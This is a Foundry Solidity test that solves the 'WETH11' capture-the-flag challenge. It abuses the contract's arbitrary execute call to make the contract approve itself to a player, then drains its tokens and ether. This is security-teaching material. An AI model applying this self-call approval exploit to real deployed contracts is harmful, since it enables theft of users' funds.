// SPDX-License-Identifier: None
pragma solidity ^0.8.13;

import { Test } from "forge-std/Test.sol";
import { WETH11 } from "../src/WETH11.sol";
import "@openzeppelin/contracts/interfaces/IERC20.sol";

/**
 * @title   Answer to the WETH11 Challenge
 * @notice  Use the payload from the execute flashloan to approve the token from the weth contract
 * @author  DrGorilla.eth
 */

contract Weth11Test is Test {
    WETH11 public weth;
    address owner;
    address bob;

    function setUp() public {
        weth = new WETH11();
        bob = makeAddr("bob");

        vm.deal(address(bob), 10 ether);
        vm.startPrank(bob);
        weth.deposit{value: 10 ether}();
        weth.transfer(address(weth), 10 ether);
        vm.stopPrank();
    }

    function testHack() public {
        assertEq(
            weth.balanceOf(address(weth)),
            10 ether,
            "weth contract should have 10 ether"
        );

        vm.startPrank(bob);

        // hack time!
        weth.execute(
            address(weth),
            0,
            abi.encodeCall(IERC20.approve, (bob, 10 ether))
        );

        weth.transferFrom(address(weth), bob, 10 ether);
        
        weth.withdrawAll();

        vm.stopPrank();

        assertEq(address(weth).balance, 0, "empty weth contract");
        assertEq(
            weth.balanceOf(address(weth)),
            0,
            "empty weth on weth contract"
        );

        assertEq(
            bob.balance,
            10 ether,
            "player should recover initial 10 ethers"
        );
    }
}